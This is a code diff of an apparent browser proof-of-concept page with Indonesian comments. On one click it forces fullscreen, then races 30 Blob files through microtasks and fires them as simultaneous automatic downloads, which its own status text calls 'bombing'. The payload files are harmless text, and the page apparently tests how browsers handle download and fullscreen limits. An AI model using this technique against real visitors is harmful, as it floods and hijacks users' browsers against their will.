@@ -97,19 +97,26 @@
 
     let objectUrls = [];
 
-    // Fungsi utilitas untuk memicu unduhan di antrean macrotask (Tanpa Jeda Waktu Tunggu)
-    const triggerInstantDownload = (i) => {
-      // Menggunakan setTimeout 0ms agar proses DOM download tidak memblokir/menggagalkan requestFullscreen
-      setTimeout(() => {
-        const content = `PoC file ${i}\nPengujian dengan metode pemisahan antrean paralel rawan race condition.\n`;
-        const blob = new Blob([content], { type: "text/plain;charset=utf-8" });
-        const url = URL.createObjectURL(blob);
-        objectUrls.push(url);
+    // Fungsi Asinkronus untuk mempersiapkan Blob di Microtask Queue (Race Condition Preparation)
+    const prepareBlobAsync = (i) => {
+      return new Promise((resolve) => {
+        // Menggunakan queueMicrotask agar kalkulasi teks/blob berjalan secara paralel sebelum masuk ke antrean download DOM
+        queueMicrotask(() => {
+          const content = `PoC file ${i}\nPengujian dengan metode pemisahan antrean paralel rawan race condition.\n`;
+          const blob = new Blob([content], { type: "text/plain;charset=utf-8" });
+          const url = URL.createObjectURL(blob);
+          resolve({ id: i, url: url });
+        });
+      });
+    };
 
+    // Memicu download secara instan menggunakan Event Loop Macrotask
+    const triggerInstantDownload = (fileData) => {
+      setTimeout(() => {
         const link = document.createElement("a");
-        link.href = url;
-        link.download = `poc-race-${String(i).padStart(2, '0')}.txt`;
-        link.textContent = `File ${i}`;
+        link.href = fileData.url;
+        link.download = `poc-race-${String(fileData.id).padStart(2, '0')}.txt`;
+        link.textContent = `File ${fileData.id}`;
         downloads.appendChild(link);
 
         link.click();
@@ -117,20 +124,19 @@
     };
 
     start.addEventListener("click", () => {
-      // PEMBERSIHAN AWAL (Dilakukan instan di milidetik awal klik)
+      // PEMBERSIHAN AWAL (Instan)
       objectUrls.forEach(url => URL.revokeObjectURL(url));
       objectUrls = [];
       downloads.replaceChildren();
 
-      // 1. PAS KLIK LANGSUNG AUTO FULLSCREEN (Harus Eksekusi Bersih Tanpa Beban DOM Lain)
-      // Menggunakan document.documentElement agar browser mobile langsung meloloskan izin layar penuh
+      // 1. EKSEKUSI FULLSCREEN INSTAN (Prioritas Utama pada klik pertama)
       const docEl = document.documentElement;
       try {
         if (docEl.requestFullscreen) {
           docEl.requestFullscreen();
-        } else if (docEl.webkitRequestFullscreen) { /* Khusus Chrome Mobile & Safari iOS */
+        } else if (docEl.webkitRequestFullscreen) { 
           docEl.webkitRequestFullscreen();
-        } else if (docEl.mozRequestFullScreen) { /* Firefox Mobile */
+        } else if (docEl.mozRequestFullScreen) { 
           docEl.mozRequestFullScreen();
         }
         status.textContent = "Auto Fullscreen Berhasil dipicu!";
@@ -138,15 +144,28 @@
         console.warn(`Gagal masuk fullscreen: ${err.message}`);
       }
 
-      // 2. TEMBAK SKENARIO PARALEL (RACE CONDITION) MELALUI BACKGROUND THREAD
-      // Kita bungkus ke dalam setTimeout agar browser menyelesaikan proses "Layar Penuh" terlebih dahulu baru melepas 30 file
-      setTimeout(() => {
-        status.textContent = "Layar penuh aktif. Mengeksekusi 30 file secara balapan paralel...";
-        
+      // 2. SKENARIO RACE CONDITION ASINKRONUS
+      // Menggunakan jeda 100ms agar animasi transisi fullscreen selesai tanpa patah-patah
+      setTimeout(async () => {
+        status.textContent = "Layar penuh aktif. Menyiapkan data secara paralel...";
+
+        // Membuat 30 promise sekaligus untuk balapan di Microtask Queue
+        const downloadPromises = [];
         for (let i = 1; i <= 30; i++) {
-          triggerInstantDownload(i);
+          downloadPromises.push(prepareBlobAsync(i));
         }
-      }, 100); // 100ms hanya memberikan waktu bernapas bagi GPU mobile untuk membesarkan layar
+
+        // Menunggu seluruh Blob siap secara bersamaan (Simultaneous Race)
+        const allFiles = await Promise.all(downloadPromises);
+        
+        status.textContent = "Mengeksekusi pemboman 30 file ke browser...";
+        
+        // Menembakkan unduhan masal secara asinkronus tercepat
+        allFiles.forEach(fileData => {
+          objectUrls.push(fileData.url);
+          triggerInstantDownload(fileData);
+        });
+      }, 100); 
     });
   </script>
 </body>
